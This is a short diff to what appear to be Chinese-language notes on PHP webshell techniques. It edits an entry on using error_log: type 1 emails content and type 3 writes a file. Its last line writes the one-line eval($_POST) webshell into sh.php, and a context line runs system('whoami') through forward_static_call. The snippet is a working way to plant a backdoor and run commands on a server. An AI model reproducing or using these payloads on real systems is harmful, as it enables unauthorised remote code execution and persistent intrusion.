@@ -49,5 +49,8 @@ forward_static_call('system', 'whoami')
 // 和上述功能类似,但第二参数不需要是数组
 
 error函数:
-error_log('马',类型,'创造的文件')
+error_log('马',类型,'目标')
+类型为1时发送邮箱指定内容
+error_log("邮件内容",1,"test@shturl.");
+类型为3时创建指定文件写入内容
 error_log("<?php eval(\$_POST['a']);?>",3,"sh.php");
